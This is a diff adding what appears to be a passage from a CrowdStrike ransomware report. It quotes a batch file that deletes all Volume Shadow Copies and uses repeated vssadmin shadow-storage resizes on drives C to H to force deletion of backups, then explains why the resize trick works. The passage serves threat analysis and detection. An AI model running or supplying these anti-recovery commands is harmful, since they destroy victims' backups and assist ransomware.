@@ -1,0 +1,16 @@
+CrowdStrike has observed another batch file, named windows.bat, which makes file recovery more difficult on the victim’s machine. It should be noted that file names can be arbitrarily  changed by the threat actors.
+vssadmin Delete Shadows /all /quiet
+vssadmin resize shadowstorage /for=c: /on=c: /maxsize=401MB
+vssadmin resize shadowstorage /for=c: /on=c: /maxsize=unbounded
+vssadmin resize shadowstorage /for=d: /on=d: /maxsize=401MB
+vssadmin resize shadowstorage /for=d: /on=d: /maxsize=unbounded
+vssadmin resize shadowstorage /for=e: /on=e: /maxsize=401MB
+vssadmin resize shadowstorage /for=e: /on=e: /maxsize=unbounded
+vssadmin resize shadowstorage /for=f: /on=f: /maxsize=401MB
+vssadmin resize shadowstorage /for=f: /on=f: /maxsize=unbounded
+vssadmin resize shadowstorage /for=g: /on=g: /maxsize=401MB
+vssadmin resize shadowstorage /for=g: /on=g: /maxsize=unbounded
+vssadmin resize shadowstorage /for=h: /on=h: /maxsize=401MB
+vssadmin resize shadowstorage /for=h: /on=h: /maxsize=unbounded
+vssadmin Delete Shadows /all /quiet
+These anti-forensic recovery commands are quite interesting and appear to make use of an undocumented feature of the vssadmin resize command. While the first command in Figure 2 above, vssadmin Delete Shadows /all /quiet, is commonly used by ransomware, the command option vssadmin resize shadowstorage is rarely used. In situations where shadow copies were not created by vssadmin, but by third-party applications (such as backup software), vssadmin can display an error and not delete the backups. One such error states: “Snapshots were found, but they were outside of your allowed context. Try removing them with the backup application which created them.” The vssadmin resize shadowstorage command is a “hack” that relies on vssadmin to delete storage when the shadow copies are resized. It forces the shadow copies to be deleted regardless of their context. The command works by resizing the default shadow volume size from 10 percent to 401 MB (the minimum size is 300 MB). Then the shadow storage is set to unbounded, which allows it to use all available disk space. The shadow copies are then deleted by calling the command vssadmin Delete Shadows /all /quiet a second time.
